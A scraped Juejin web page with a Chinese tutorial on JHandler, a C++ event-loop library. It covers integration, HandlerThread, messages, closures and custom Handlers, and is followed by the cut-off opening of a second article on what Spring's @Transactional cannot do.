                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">零、JHandler</h2>
<p><strong>JHandler 是一套 C++ 的事件循环机制。</strong> 可在自行创建的线程中使用，也可以使用 JHandler 已封装好的独立线程处理事件。</p>
<p>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FzincPower%2FJHandler" target="_blank" title="https://github.com/zincPower/JHandler" ref="nofollow noopener noreferrer">github.com/zincPower/J…</a></p>
<h2 data-id="heading-1">一、集成</h2>
<p>将项目中 <code>jhandler</code> 文件夹拷贝添加到项目中，并在项目的 <code>CMakeLists.txt</code> 中添加以下配置即可：</p>
<pre><code class="hljs language-cmake" lang="cmake">include_directories(“添加的 jhandler 目录相对于当前 CMakeLists.txt 文件的路径”/jhandler/include)
add_subdirectory(jhandler)

target_link_libraries(“链接目标名称” PUBLIC jhandler)
</code></pre>
<h2 data-id="heading-2">二、常规使用</h2>
<h3 data-id="heading-3">1、使用 JHandler 自带的线程</h3>
<p><code>JHandler</code> 中已经准备好了 <code>HandlerThread</code> ，<strong>内部会在调用 <code>start</code> 方法后创建独立线程</strong>，按照放入消息和闭包的顺序，串行分发事件消息或执行闭包。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 创建 HandlerThread</span>
<span class="hljs-keyword">auto</span> handlerThread = jhandler::HandlerThread::<span class="hljs-built_in">create</span>();
<span class="hljs-comment">// 启动 HandlerThread ，内部会启动线程</span>
handlerThread-&gt;<span class="hljs-built_in">start</span>();

<span class="hljs-comment">// 对 HandlerThread 进行使用</span>

<span class="hljs-comment">// 退出 HandlerThread ，会执行完已经放入的事件消息和闭包</span>
handlerThread-&gt;<span class="hljs-built_in">quit</span>();
</code></pre>
<p><strong><code>quit</code> 方法不会阻塞当前线程，会让 <code>HandlerThread</code> 内部线程在处理完所有的消息和闭包后关闭线程。</strong></p>
<h3 data-id="heading-4">2、添加事件消息、闭包</h3>
<p>启动 <code>HandlerThread</code> 后，可以放入<strong>闭包</strong>或<strong>事件消息 <code>Message</code></strong> 。</p>
<p><strong>闭包：</strong> 调用 <code>Handler-&gt;post(std::function&lt;void()&gt; fun)</code> 方法放入闭包，具体下所示：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">auto</span> name = <span class="hljs-string">"江澎涌"</span>;
handler-&gt;<span class="hljs-built_in">post</span>([name]() {
jhandler::Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"【runClosure】运行闭包 name="</span>, name, <span class="hljs-string">" Looper 线程 id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
});

<span class="hljs-comment">// 输出</span>
<span class="hljs-comment">// 【CommonUse】 【runClosure】运行闭包 name=江澎涌 Looper 线程 id=0x700000339000</span>
</code></pre>
<p><strong>事件消息 Message：</strong> 调用 <code>Handler-&gt;sendMessage(std::unique_ptr&lt;Message&gt; message)</code> 方法放入事件消息。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">auto</span> message = jhandler::Message::<span class="hljs-built_in">obtain</span>();             <span class="hljs-comment">// 获取事件消息</span>
message-&gt;what = SAY_HI;                                 <span class="hljs-comment">// 事件类别</span>
message-&gt;data = std::<span class="hljs-built_in">make_shared</span>&lt;std::string&gt;(<span class="hljs-string">"江澎涌"</span>); <span class="hljs-comment">// 事件数据</span>
message-&gt;arg1 = <span class="hljs-number">1994</span>;
message-&gt;arg2 = <span class="hljs-number">170</span>;
handler-&gt;<span class="hljs-built_in">sendMessage</span>(std::<span class="hljs-built_in">move</span>(message));               <span class="hljs-comment">// 放入事件消息</span>

<span class="hljs-comment">// 输出</span>
<span class="hljs-comment">// 【FirstCommonUseHandler】 【handleMessage】你好，江澎涌(1994,170) Looper 线程 id=0x70000589c000</span>
</code></pre>
<blockquote>
<p>如何处理事件消息，请查看 <strong>“自定义事件处理的 Handler”</strong> 小节。</p>
</blockquote>
<h3 data-id="heading-5">3、移除消息</h3>
<p>可以通过 <code>Handler-&gt;removeMessage(int32_t what)</code> 移除与 <code>what</code> 相同的事件消息。</p>
<pre><code class="hljs language-cpp" lang="cpp">handler-&gt;<span class="hljs-built_in">removeMessage</span>(SAY_HI);
</code></pre>
<p>可以通过 <code>Handler-&gt;removeAllMessages()</code> 移除所有的闭包和事件消息。</p>
<pre><code class="hljs language-cpp" lang="cpp">handler-&gt;<span class="hljs-built_in">removeAllMessages</span>();
</code></pre>
<h3 data-id="heading-6">4、定义处理事件消息的 Handler</h3>
<p>放入的事件消息，需要开发者继承 <code>jhandler::Handler</code> 编写自定义事件处理的 <code>Handler</code> 进行接收处理。</p>
<p>在重写的 <code>handleMessage</code> 方法中接收放入的事件消息，编写相应业务的逻辑。具体编写如下：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 定义事件消息 what</span>
<span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">int</span> SAY_HI = <span class="hljs-number">10000</span>;

<span class="hljs-comment">// 定义 Handler</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">FirstCommonUseHandler</span> : <span class="hljs-keyword">public</span> jhandler::Handler {
<span class="hljs-keyword">private</span>:
    <span class="hljs-type">static</span> std::string TAG;
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">FirstCommonUseHandler</span><span class="hljs-params">(std::shared_ptr&lt;jhandler::Looper&gt; looper)</span> </span>{}
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">handleMessage</span><span class="hljs-params">(<span class="hljs-type">const</span> std::unique_ptr&lt;jhandler::Message&gt; &amp;message)</span> <span class="hljs-keyword">override</span></span>{
        <span class="hljs-comment">// 此处接收 Message 编写自己的业务逻辑</span>
        <span class="hljs-keyword">switch</span> (message-&gt;what) {
            <span class="hljs-keyword">case</span> SAY_HI: {
                <span class="hljs-keyword">auto</span> name = message-&gt;<span class="hljs-built_in">getData</span>&lt;std::string&gt;();
                <span class="hljs-keyword">auto</span> year = message-&gt;arg1;
                <span class="hljs-keyword">auto</span> height = message-&gt;arg2;
                Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"【handleMessage】你好，"</span>, *name, <span class="hljs-string">"("</span>, year, <span class="hljs-string">","</span>, height, <span class="hljs-string">")"</span>, <span class="hljs-string">" Looper 线程 id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
                <span class="hljs-keyword">break</span>;
            }
            <span class="hljs-keyword">case</span> SHOW_DESCRIPTION: {
                Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"【handleMessage】我是一个 C++ 事件循环机制 Looper 线程 id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
                <span class="hljs-keyword">break</span>;
            }
        }
    }
};

<span class="hljs-comment">// 创建 HandlerThread</span>
<span class="hljs-keyword">auto</span> handlerThread = jhandler::HandlerThread::<span class="hljs-built_in">create</span>();
<span class="hljs-comment">// 启动 HandlerThread</span>
handlerThread-&gt;<span class="hljs-built_in">start</span>();
<span class="hljs-comment">// 获取 Looper</span>
<span class="hljs-keyword">auto</span> looper = handlerThread-&gt;<span class="hljs-built_in">getLooper</span>();
<span class="hljs-comment">// 创建自己的 Handler</span>
<span class="hljs-keyword">auto</span> handler = std::<span class="hljs-built_in">make_shared</span>&lt;FirstCommonUseHandler&gt;(looper);
<span class="hljs-comment">// 事件消息传递</span>
<span class="hljs-keyword">auto</span> message = jhandler::Message::<span class="hljs-built_in">obtain</span>();
message-&gt;what = SAY_HI;
message-&gt;data = std::<span class="hljs-built_in">make_shared</span>&lt;std::string&gt;(<span class="hljs-string">"江澎涌"</span>);
message-&gt;arg1 = <span class="hljs-number">1994</span>;
message-&gt;arg2 = <span class="hljs-number">170</span>;
handler-&gt;<span class="hljs-built_in">sendMessage</span>(std::<span class="hljs-built_in">move</span>(message));

message = jhandler::Message::<span class="hljs-built_in">obtain</span>();
message-&gt;what = SHOW_DESCRIPTION;
handler-&gt;<span class="hljs-built_in">sendMessage</span>(std::<span class="hljs-built_in">move</span>(message));

<span class="hljs-comment">// 输出 </span>
<span class="hljs-comment">// 【FirstCommonUseHandler】 【handleMessage】你好，江澎涌(1994,170) Looper 线程 id=0x70000589c000</span>
<span class="hljs-comment">// 【FirstCommonUseHandler】 【handleMessage】我是一个 C++ 事件循环机制 Looper 线程 id=0x70000589c000</span>
</code></pre>
<h3 data-id="heading-7">5、多个 Handler 解耦逻辑</h3>
<p>有时需要将处理事件消息的逻辑解耦，可以考虑通过 <code>Looper</code> 创建多个 <code>Handler</code> ，将事件消息发送到对应的 <code>Handler</code> ，后续会由该 <code>Handler</code> 执行对应逻辑，并且<strong>多个 <code>Handler</code> 都是运行在同一个线程中，按添加顺序进行执行。</strong></p>
<p>具体编写如下：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">auto</span> handlerThread = jhandler::HandlerThread::<span class="hljs-built_in">create</span>();
handlerThread-&gt;<span class="hljs-built_in">start</span>();

<span class="hljs-keyword">auto</span> looper = handlerThread-&gt;<span class="hljs-built_in">getLooper</span>();
<span class="hljs-comment">// 创建两个 Handler</span>
<span class="hljs-keyword">auto</span> handler1 = std::<span class="hljs-built_in">make_shared</span>&lt;FirstCommonUseHandler&gt;(looper);
<span class="hljs-keyword">auto</span> handler2 = std::<span class="hljs-built_in">make_shared</span>&lt;SecondCommonUseHandler&gt;(looper);

<span class="hljs-comment">// 向 handler1 发送 SAY_HI 类型的 message ，由 handler1 进行处理 </span>
<span class="hljs-keyword">auto</span> message = jhandler::Message::<span class="hljs-built_in">obtain</span>();
message-&gt;what = SAY_HI;
message-&gt;data = std::<span class="hljs-built_in">make_shared</span>&lt;std::string&gt;(<span class="hljs-string">"江澎涌"</span>);
message-&gt;arg1 = <span class="hljs-number">1994</span>;
message-&gt;arg2 = <span class="hljs-number">170</span>;
handler1-&gt;<span class="hljs-built_in">sendMessage</span>(std::<span class="hljs-built_in">move</span>(message));

<span class="hljs-comment">// 向 handler2 发送 SAY_HI 类型的 message ，由 handler2 进行处理 </span>
message = jhandler::Message::<span class="hljs-built_in">obtain</span>();
message-&gt;what = SAY_HI;
message-&gt;data = std::<span class="hljs-built_in">make_shared</span>&lt;std::string&gt;(<span class="hljs-string">"jiang peng yong"</span>);
message-&gt;arg1 = <span class="hljs-number">2025</span>;
message-&gt;arg2 = <span class="hljs-number">100</span>;
handler2-&gt;<span class="hljs-built_in">sendMessage</span>(std::<span class="hljs-built_in">move</span>(message));

<span class="hljs-comment">// 会看到以下输出，虽然是同一类型消息，但由不同 Handler 进行处理，并且线程是相同的且按顺序执行</span>
<span class="hljs-comment">//【FirstCommonUseHandler】 【handleMessage】你好，江澎涌(1994,170) Looper 线程 id=0x700009ae3000</span>
<span class="hljs-comment">//【SecondCommonUseHandler】 【handleMessage】hello, jiang peng yong(2025,100) Looper 线程 id=0x700009ae3000</span>
</code></pre>
<blockquote>
<p><code>FirstCommonUseHandler</code> 和 <code>SecondCommonUseHandler</code> 请查看源码不再赘述。</p>
</blockquote>
<h2 data-id="heading-8">三、自定义线程中使用 JHandler</h2>
<p>有些情况下，需要在自己的线程中使用事件循环机制，所以 JHandler 也支持在自定义线程中增加事件循环机制。</p>
<p>例如在鸿蒙中，需要封装一个 OpenGL 线程给到相机使用，OpenGL 是线程相关的，需要一个事件循环不断的处理每一帧数据，同时处理好 Surface 、滤镜等数据。以下便是一个 OpenGL 的模拟样例：</p>
<blockquote>
<p>完整代码可以查看 <code>thread_use.cpp</code></p>
</blockquote>
<p><strong>在自定义线程中，按照如下步骤进行：</strong></p>
<ol>
<li>增加 egl 的创建，通过 <code>jhandler::Looper::create()</code> 创建 <code>Looper</code> ，然后创建内部的 Handler 用于处理后续的相机帧、滤镜管理等。</li>
<li>调用 <code>Looper::loop()</code> 方法，进入事件循环，直到外部调用 <code>Looper::quit()</code> 终止事件循环。</li>
<li>释放和回收 egl 相关资源。</li>
</ol>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">GLThread::loop</span><span class="hljs-params">(<span class="hljs-type">const</span> std::shared_ptr&lt;GLThread&gt; &amp;glThread)</span> </span>{
    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 进入 GLThread 启动 GL 逻辑 ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());

    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 模拟创建 EGL 相关环境 ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
    <span class="hljs-comment">// 睡眠了 500 毫秒，模拟创建 EGL</span>
    std::this_thread::<span class="hljs-built_in">sleep_for</span>(std::chrono::<span class="hljs-built_in">milliseconds</span>(<span class="hljs-number">500</span>));

    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 进入事件循环 ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
    glThread-&gt;mLooper-&gt;<span class="hljs-built_in">loop</span>();
    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 退出事件循环 ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());

    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 开始释放资源 ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());

    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 释放 EGL ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());

    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 释放 Handler ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
    glThread-&gt;mHandler-&gt;<span class="hljs-built_in">removeAllMessages</span>();
    glThread-&gt;mHandler = <span class="hljs-literal">nullptr</span>;

    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"释放 Looper"</span>);
    glThread-&gt;mLooper = <span class="hljs-literal">nullptr</span>;
    <span class="hljs-built_in">quitLoop</span>(glThread);
    Log::<span class="hljs-built_in">i</span>(TAG, <span class="hljs-string">"------------------------ 退出 GLThread 线程 ------------------------ thread id="</span>, std::this_thread::<span class="hljs-built_in">get_id</span>());
}
</code></pre>
<p>同样也支持多个 Handler 解耦逻辑，通过获取内部的 <code>Looper</code> 创建对应的 <code>Handler</code> 即可。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">threadUse</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">auto</span> glThread = std::<span class="hljs-built_in">make_shared</span>&lt;GLThread&gt;();
    glThread-&gt;<span class="hljs-built_in">start</span>();

    <span class="hljs-comment">// 创建业务需要的 handler ，可以不耦合 gl 的相关流程</span>
    <span class="hljs-keyword">auto</span> businessHandler = std::<span class="hljs-built_in">make_shared</span>&lt;BusinessHandler&gt;(glThread-&gt;<span class="hljs-built_in">getLooper</span>());
    businessHandler-&gt;<span class="hljs-built_in">sayHello</span>();

    <span class="hljs-keyword">auto</span> glHandler = glThread-&gt;<span class="hljs-built_in">getHandler</span>();
    glHandler-&gt;<span class="hljs-built_in">addFilter</span>();
    glHandler-&gt;<span class="hljs-built_in">requestRender</span>();
    glHandler-&gt;<span class="hljs-built_in">removeFilter</span>();

    businessHandler-&gt;<span class="hljs-built_in">sayHello</span>();

    glThread-&gt;<span class="hljs-built_in">quit</span>();

    <span class="hljs-comment">// 为了让内部执行外，才结束整个项目运行。</span>
    std::this_thread::<span class="hljs-built_in">sleep_for</span>(std::chrono::<span class="hljs-built_in">seconds</span>(<span class="hljs-number">1</span>));
    
    <span class="hljs-comment">// 输出</span>
    <span class="hljs-comment">// 【GLHandler】 添加滤镜 filterName=0x600002314048 thread id=0x700009ae3000</span>
    <span class="hljs-comment">// 【GLHandler】 进行渲染 thread id=0x700009ae3000</span>
    <span class="hljs-comment">// 【GLHandler】 移除滤镜 filterName=0x600002314078 thread id=0x700009ae3000</span>
    <span class="hljs-comment">// 【BusinessHandler】 你好 thread id=0x700009ae3000</span>
}
</code></pre>
<h2 data-id="heading-9">四、作者简介</h2>
<p>掘金：<a href="https://juejin.im/user/5c3033ef51882524ec3a88ba/posts" target="_blank" title="https://juejin.im/user/5c3033ef51882524ec3a88ba/posts">juejin.im/user/5c3033…</a></p>
<p>csdn：<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fweixin_37625173" target="_blank" title="https://blog.csdn.net/weixin_37625173" ref="nofollow noopener noreferrer">blog.csdn.net/weixin_3762…</a></p>
<p>公众号：微信搜索 "江澎涌"</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[@Transactional做不到的5件事，我用这6种方法解决了]]></title>    <link>https://juejin.cn/post/7575104251866398730</link>    <guid>https://juejin.cn/post/7575104251866398730</guid>    <pubDate>2025-11-23T02:52:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575104251866398730" data-draft-id="7575133880435753011" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="@Transactional做不到的5件事，我用这6种方法解决了"/> <meta itemprop="keywords" content="Spring Boot,后端,面试"/> <meta itemprop="datePublished" content="2025-11-23T02:52:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="踏浪无痕"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            @Transactional做不到的5件事，我用这6种方法解决了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    踏浪无痕
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T02:52:00.000Z" title="Sun Nov 23 2025 02:52:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    37
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">@Transactional做不到的5件事，我用这6种方法解决了</h2>
<p>看Mall项目订单代码时发现：一个方法操作6张表，14步业务逻辑，全在一个事务里，居然没炸。</p>
<p>研究了两天，发现了6种比<code>@Transactional</code>更灵活的玩法。写了个demo项目验证了一遍。</p>
<h3 data-id="heading-1">我们要解决的痛点</h3>
<p>日常开发中，<code>@Transactional</code>解决不了的几个问题：</p>
<ol>
<li><strong>库存不足时</strong>：想保留订单记录标记"待补货"，但不知道怎么不回滚</li>
<li><strong>发MQ消息</strong>：在事务里发了消息，结果事务回滚了，消息却发出去了</li>
<li><strong>批量操作</strong>：100个订单发货，1个失败就全部回滚，但其实想让成功的继续</li>
